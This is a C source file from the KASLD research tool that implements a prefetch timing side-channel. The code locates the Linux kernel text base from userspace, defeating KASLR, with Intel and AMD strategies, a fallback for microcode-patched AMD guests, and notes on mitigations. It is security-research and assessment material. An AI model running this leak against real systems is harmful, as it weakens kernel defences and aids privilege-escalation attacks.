// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Prefetch side-channel KASLR bypass.
//
// Technique by Daniel Gruss, Clémentine Maurice, Anders Fogh, Moritz Lipp,
// and Stefan Mangard, presented at USENIX Security 2016:
// "Prefetch Side-Channel Attacks: Bypassing SMAP and KASLR"
//
// The x86 prefetch instructions (prefetchnta, prefetcht2, ...) trigger
// address translation but do not raise faults on inaccessible memory.
// Their execution time varies depending on whether the target virtual
// address has a valid mapping in the page table hierarchy.
//
// By timing prefetch across every possible KASLR slot we can identify
// where the kernel text is mapped, defeating KASLR from userspace.
//
// On x86_64 with the default 2 MiB alignment there are 512 candidate
// positions in the 1 GiB window [0xffffffff80000000, 0xffffffffc0000000).
// The technique completes in under a second.
//
// Requires KPTI to be disabled to work, because KPTI unmaps kernel pages
// from userspace page tables, eliminating the timing differential. The
// kernel auto-disables KPTI on CPUs that are not vulnerable to Meltdown
// (CVE-2017-5754): all AMD CPUs, and Intel CPUs from ~2019 onward (Ice
// Lake and later) with hardware mitigations. KPTI can also be manually
// disabled with the "nopti" kernel parameter.
//
// Unlike EntryBleed (CVE-2022-4543), this technique does not require
// kernel-version-specific offsets.
//
// Both strategies find the base as the LEFT EDGE of the contiguous mapped
// kernel region — the first mapped slot — not the extremum within it. The base
// slot (head/entry text) carries a weaker signal than the hot kernel body, so
// keying off the extremum (or a body-tuned threshold) reports the base one slot
// high; edge detection to the unmapped->mapped transition recovers it.
//
// Intel strategy:
//   Mapped kernel pages resolve faster (TLB hit) than unmapped ones. The global
//   minimum is a seed guaranteed to lie inside the kernel; the base is found by
//   walking LEFT from it to the unmapped->mapped transition. Per-slot minimums
//   across iterations are used.
//
// AMD strategy:
//   The timing signal is inverted: mapped pages produce higher latency than
//   unmapped ones (the page walk completes fully rather than being quickly
//   NOPped). Two collectors feed the same leftmost-cluster edge finder; the
//   cheap one runs first and the expensive one is a fallback.
//
//   Primary: per-slot sums of single timed prefetches across iterations, which
//   preserve the slow-vs-fast proportion when rdtscp resolves only to coarse
//   quanta (min and median collapse to a single quantum; the sum stays
//   continuous). The kernel region is the leftmost cluster of slots exceeding
//   1.5x the median (a confirmation window filters PDP entry boundary artifacts
//   ~1.2x median, 7 slots wide every 128 slots, and isolated scheduling
//   outliers); the left edge is then walked out to the baseline transition with
//   a looser 1.25x bound to recover the base slot, which the sum leaves weaker
//   than the region body. A virtualized AMD guest can produce a differential of
//   only a few percent — well below 1.5x — yet coherent across the whole kernel
//   image; when the 1.5x search finds nothing a further tier scales the
//   threshold to the baseline dispersion (median absolute deviation) so a
//   low-amplitude plateau still clears it, gated on a minimum plateau width so
//   the few-slot boundary bands (taller than such a plateau) cannot qualify.
//
//   Fallback (when the sum finds no cluster): a batched collector times many
//   back-to-back prefetches to one address under a single rdtscp bracket,
//   amortizing the timer overhead so the measured span is dominated by
//   per-access page-walk latency. This exposes a mapped/unmapped differential
//   that a single timed prefetch leaves buried in rdtscp quantization — on some
//   parts, notably microcode-mitigated AMD under nested paging, a mapped slot
//   then reads many-fold above baseline where a single-prefetch scan reads
//   flat. The batched profile is strongly bimodal and its base slot is as
//   strong as the body, so its edge finder takes the leftmost slot of a plateau
//   many times the median (a high threshold even a contention-perturbed
//   baseline stays well under) with no loose left-walk — nothing is mapped
//   below the base. A batched pass is far costlier than a summed one, so it
//   runs only as a fallback and stops as soon as two passes agree.
//
// Limitations:
//   - Requires KPTI to be disabled (no signal through KPTI page tables).
//   - Timing resolution depends on rdtscp granularity, which varies
//     across microarchitectures.
//   - Recent AMD microcode eliminates the page-walk timing differential on
//     bare metal (CVE-2021-26318 / AMD-SB-1017): the sweep reads flat and no
//     base is reported. The differential persists inside virtual machines,
//     where nested paging reintroduces it, and on older unpatched microcode.
//     A flat result on a patched AMD CPU is the mitigation working, not a
//     tool fault.
//   - The signal can be transiently masked by system state (scheduler
//     placement, CPU power / frequency state, thermal throttling,
//     concurrent load) and reappear after the state changes. A run
//     that returns no result is not proof the technique does not
//     apply to the CPU.
//
// Timing measurement inline asm based on the EntryBleed PoC by Will:
//   https://www.willsroot.io/2022/12/entrybleed.html
//
// AMD vendor-specific handling informed by Google security-research
// kernelctf submission (CVE-2023-6817) by 'run':
//   https://github.com/google/security-research/blob/master/pocs/linux/
//   kernelctf/CVE-2023-6817_mitigation/exploit/mitigation-v3-6.1.55/exploit.c
//
// Leak primitive:
//   Data leaked:      kernel text virtual base address
//   Kernel subsystem: arch/x86 — CPU prefetch timing side-channel
//   Data structure:   kernel text mapping (page table walk timing)
//   Address type:     virtual (kernel text)
//   Method:           timing (prefetch latency, 2 MiB scan)
//   Status:           unfixed (hardware side-channel)
//   Access check:     N/A (hardware side-channel — no kernel gate)
//   Source:           N/A (hardware side-channel)
//
// Mitigations:
//   KPTI (CONFIG_PAGE_TABLE_ISOLATION=y) removes kernel mappings from
//   userspace page tables, eliminating the timing differential. KPTI is
//   auto-disabled for CPUs not vulnerable to Meltdown (all AMD, Intel Ice
//   Lake+); on those CPUs the prefetch timing differential is in scope
//   by default and no kernel patch addresses it directly.
//
//   On AMD, microcode updates for CVE-2021-26318 (AMD-SB-1017) remove the
//   prefetch page-walk timing differential on bare metal. The batched fallback
//   collector still recovers the base inside virtual machines, where nested
//   paging reintroduces the differential, and on pre-fix microcode.
//
// References:
//   https://gruss.cc/files/prefetch.pdf
//   https://github.com/IAIK/prefetch
//   https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/gruss
//   https://www.amd.com/en/resources/product-security/bulletin/amd-sb-1017.html
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include "include/prefetch_scan.h"
#include "include/sidechannel.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Prefetch side-channel (Gruss et al., 2016): the x86 PREFETCH "
    "instruction has measurably different latency for mapped versus "
    "unmapped kernel pages, even from user mode. By timing PREFETCH "
    "across KASLR-aligned candidate addresses, the mapped kernel text "
    "base is identified. Mitigated by KPTI (separate page tables for "
    "user/kernel mode).");

KASLD_META("method:timing\n"
           "phase:probing\n"
           "live:1\n"
           "addr:virtual\n"
           "hardware:KPTI\n");

static int verbose = 0;

// ---------------------------------------------------------------------------
// The kernel text KASLR window: NUM_SLOTS candidate positions of STEP bytes.
// The scan and left-edge detection live in prefetch_scan.h; CONFIRM_K/M tune
// the AMD cluster confirmation to the ~15-slot kernel text block.
// ---------------------------------------------------------------------------
#define STEP KASLR_VIRT_ALIGN
#define NUM_SLOTS ((KERNEL_VIRT_TEXT_MAX - KERNEL_VIRT_TEXT_MIN) / STEP)
#define ITERATIONS 64
// The batched AMD collector amortizes the timer over a large prefetch batch, so
// its per-slot signal is far cleaner than the single-prefetch sum; a handful of
// min-over-trials sweeps already converge.
#define BATCH_ITERATIONS 10
#define CONFIRM_K 5
#define CONFIRM_M 8

// ---------------------------------------------------------------------------
// Majority vote across up to `max_passes` passes. On AMD, `batched` selects the
// batched collector (a strong page-walk-latency amplifier) over the
// single-prefetch sum; it is ignored for other vendors, whose
// FASTER-when-mapped orientation the batched collector does not model.
//
// A batched pass is far more expensive than a summed one — a whole batch of
// prefetches per slot rather than one timed prefetch — and on a slow page-walk
// host (e.g. an oversubscribed Zen 1 guest) a full 512-slot batched pass costs
// seconds. Because the batched signal is strong and stable, it needs fewer
// passes than the summed sum: the vote runs at most BATCH_PASSES and exits
// early once one base has an unbeatable majority of them. A base is committed
// only when it is corroborated by a majority of passes, never a single lucky
// one — a transient contention burst can forge a false cluster in one pass, but
// being temporal it does not recur at the same slots the next pass, so it can
// never reach a majority.
// ---------------------------------------------------------------------------
#define NUM_PASSES 7
#define BATCH_PASSES 5

static unsigned long majority_vote(int cpu_vendor, int batched, int *n_found) {
  unsigned long results[NUM_PASSES];
  uint64_t times[NUM_SLOTS];
  int use_batched = batched && cpu_vendor == CPU_VENDOR_AMD;
  int max_passes = use_batched ? BATCH_PASSES : NUM_PASSES;
  int iters = use_batched ? BATCH_ITERATIONS : ITERATIONS;
  int npasses = 0;
  int i;

  for (i = 0; i < max_passes; i++) {
    if (use_batched)
      prefetch_scan_collect_batched(times, NUM_SLOTS, KERNEL_VIRT_TEXT_MIN,
                                    STEP, iters);
    else
      prefetch_scan_collect(times, NUM_SLOTS, KERNEL_VIRT_TEXT_MIN, STEP,
                            cpu_vendor, iters);

    if (verbose && i == 0)
      prefetch_scan_dump(times, NUM_SLOTS, KERNEL_VIRT_TEXT_MIN, STEP,
                         use_batched                    ? "batch_min_cycles"
                         : cpu_vendor == CPU_VENDOR_AMD ? "sum_cycles"
                                                        : "min_cycles");

    long edge = use_batched
                    ? prefetch_scan_find_edge_batched(times, NUM_SLOTS,
                                                      CONFIRM_K, CONFIRM_M)
                    : prefetch_scan_find_edge(times, NUM_SLOTS, cpu_vendor,
                                              CONFIRM_K, CONFIRM_M);
    results[i] =
        edge < 0 ? 0 : KERNEL_VIRT_TEXT_MIN + (unsigned long)edge * STEP;
    npasses = i + 1;

    if (verbose)
      fprintf(stderr, "# pass %d: 0x%lx\n", i, results[i]);

    /* Batched early-exit: stop once one base holds an unbeatable majority of
     * the pass budget (the remaining passes cannot overturn it), so a clean
     * signal pays only the passes it takes to corroborate — but never commit on
     * fewer than a majority, so a one-off false cluster from a contention burst
     * is outvoted rather than trusted. */
    if (use_batched && results[i]) {
      int votes = 0, j;
      for (j = 0; j <= i; j++)
        if (results[j] == results[i])
          votes++;
      if (votes > max_passes / 2)
        break;
    }
  }

  /* Count passes that located a mapped-kernel cluster (non-zero). This lets the
   * caller distinguish a total ABSENCE of signal (no cluster in any pass — the
   * scan saw only baseline and page-table-boundary timing) from an UNSTABLE one
   * (candidates found but scattered by noise, so no majority forms). */
  if (n_found) {
    *n_found = 0;
    for (i = 0; i < npasses; i++)
      if (results[i])
        (*n_found)++;
  }

  /* Boyer-Moore majority vote */
  unsigned long candidate = 0;
  int count = 0;

  for (i = 0; i < npasses; i++) {
    if (count == 0) {
      candidate = results[i];
      count = 1;
    } else if (results[i] == candidate) {
      count++;
    } else {
      count--;
    }
  }

  /* Verify the candidate actually has majority */
  count = 0;
  for (i = 0; i < npasses; i++) {
    if (results[i] == candidate)
      count++;
  }

  if (count > npasses / 2)
    return candidate;

  return 0;
}

// ---------------------------------------------------------------------------
// Main entry point.
// ---------------------------------------------------------------------------
static unsigned long get_kernel_addr_prefetch(void) {
  int cpu = detect_cpu_vendor();
  bool pti = detect_kpti();

  if (cpu == CPU_VENDOR_UNKNOWN)
    kasld_info("unknown CPU vendor, assuming Intel-like behavior");
  else
    kasld_info("%s CPU detected", cpu == CPU_VENDOR_AMD ? "AMD" : "Intel");

  if (!has_rdtscp()) {
    kasld_err("rdtscp instruction not supported on this CPU");
    return 0;
  }

  if (pti) {
    fprintf(stderr,
            "[-] KPTI is enabled; prefetch side-channel is ineffective\n"
            "    (kernel pages unmapped from userspace page tables)\n");
    return 0;
  }

  kasld_info("KPTI is not detected");

  pin_cpu(0);

  int n_found = 0;
  /* Try the cheap single-prefetch sum first: it resolves the base on most AMD
   * parts (including the low-amplitude virtualized case) in milliseconds. Only
   * when it finds nothing fall back to the batched collector — a strong
   * amplifier that recovers the base where a single timed prefetch reads flat
   * (notably microcode-mitigated AMD under nested paging), but whose per-slot
   * batch makes a full scan cost up to seconds on a slow page-walk host. */
  unsigned long addr = majority_vote(cpu, /*batched=*/0, &n_found);
  if (!addr && cpu == CPU_VENDOR_AMD)
    addr = majority_vote(cpu, /*batched=*/1, &n_found);

  if (!addr) {
    if (n_found == 0)
      kasld_err(
          "no kernel-text signal: the scan found no mapped-kernel cluster, "
          "only the unmapped baseline and page-table-boundary timing. This "
          "CPU may not leak the kernel base through prefetch page-walk "
          "latency.");
    else
      kasld_err(
          "unstable prefetch signal: %d/%d passes located a candidate but "
          "none held a majority (scheduler / CPU-frequency / thermal noise; "
          "a quieter run may resolve it).",
          n_found, NUM_PASSES);
    return 0;
  }

  if (kasld_addr_is_kernel_text(addr))
    return addr;

  kasld_err("discarding candidate 0x%lx: outside the kernel-text window", addr);
  return 0;
}

int main(int argc, char *argv[]) {
  kasld_cli(argc, argv);
  if (kasld_skip_live_probe("prefetch"))
    return 0;
  verbose = kasld_is_verbose();

  kasld_info("trying prefetch side-channel ...");

  unsigned long addr = get_kernel_addr_prefetch();
  if (!addr) /* get_kernel_addr_prefetch already reported the specific reason */
    return 0;

  kasld_info("possible kernel base: %lx", addr);
  /* The prefetch latency scan locates the kernel image BASE (the lowest mapped
   * kernel page, _text), so it reports a base claim (POS_BASE) and leaves
   * reconciliation to the engine. Region KERNEL_IMAGE, not KERNEL_TEXT: the
   * value is the image base, and text_pin_from_observation reads a KERNEL_TEXT
   * base as _stext and subtracts the head gap (no-op on x86_64 where _stext ==
   * _text, but wrong on STEXT_OFFSET arches). The scan is a cache-timing
   * measurement that can sit a KASLR slot off the true base, so it emits at
   * CONF_TIMING — the weakest pin: a higher-confidence (parsed) base overrides
   * it, and an agreeing base corroborates it. */
  kasld_result_base(KASLD_TYPE_VIRT, REGION_KERNEL_IMAGE, addr, NULL,
                    CONF_TIMING);

  return 0;
}
